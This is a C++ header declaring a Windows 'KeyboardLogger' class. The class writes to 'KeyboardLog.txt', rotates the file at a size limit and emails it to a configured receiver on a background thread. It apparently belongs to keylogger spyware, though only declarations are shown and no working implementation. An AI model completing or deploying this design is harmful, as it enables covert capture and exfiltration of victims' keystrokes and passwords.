#pragma once
#include <fstream>
#include <ctime>
#include <chrono>
#include <windows.h>
#include "ILogger.h"
#include "Email.h"
#define FILE_NAME L"KeyboardLog.txt"
class KeyboardLogger : ILogger
{
private:
	HANDLE hFile;
	long long maxLength;
	long long currentLength;
	string emailReceiver;
	string getCurrentTime();
	static void sendFileNewThread(LPVOID arg);
public:
	KeyboardLogger(long long maxLength, string emailReceiver);
	~KeyboardLogger();
	virtual void addMessage(string mes);
	static void clearFile(wstring fileName);
	virtual void sendFile(wstring fileName);
	wstring renameCurrentFile();
};

